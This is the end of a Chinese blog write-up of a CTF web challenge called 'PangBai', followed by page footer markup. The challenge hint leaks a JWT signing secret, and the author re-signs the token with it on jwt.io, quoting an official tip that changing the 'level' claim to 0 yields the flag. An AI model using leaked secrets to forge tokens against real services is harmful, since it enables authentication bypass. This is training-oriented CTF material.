+<p>hint：PangBai 以一种难以形容的表情望着你——激动的、怀念的，却带着些不安与惊恐，像落单后归家的雏鸟，又宛若雷暴中遇难的船员。 你似乎无法抵御这种感觉的萦绕，像是一瞬间被推入到无法言喻的深渊。尽管你尽力摆脱，但即便今后夜间偶见酣眠，这一瞬间塑成的梦魇也成为了美梦的常客。 「像■■■■验体■■不可能■■■■ JWT 这种■■ H4oQ8AgYw5KlqPbF ■■■密钥，除非■■■■■走，难道■■■■■■吗？！」 「……」</p>
+<p>所以去jwt，发现secret刚好是H4oQ8AgYw5KlqPbF</p>
+<p>扔到jwt.io</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">base64UrlEncode(header)+&quot;.&quot;+</span><br><span class="line">base64UrlEncode(payload),</span><br><span class="line">H4oQ8AgYw5KlqPbF</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>jwt网站更新了，需要重新手写这个secret，所以就没跑出来</p>
+<p>这里附上原本的WP</p>
+<pre><code>TIP
+
+修改 level 为 0 而不是 7，是本题的一个彩蛋。本关卡不断提示「一方通行」，而「一方通行」作为动画番剧《魔法禁书目录》《某科学的超电磁炮》中的人物，是能够稳定晋升为 Level 6 的强者，却被 Level 0 的「上条当麻」多次击败。但即使不了解该内容，也可以通过多次尝试找到 Level 0，做安全需要反常人的思维，这应当作为一种习惯。
+</code></pre>
+<p>第〇关·终章</p>
+<p>点击提示中的「从梦中醒来」，过完一个片尾小彩蛋即获得 Flag 内容。</p>
+</li>
+</ul>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: Huaji | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
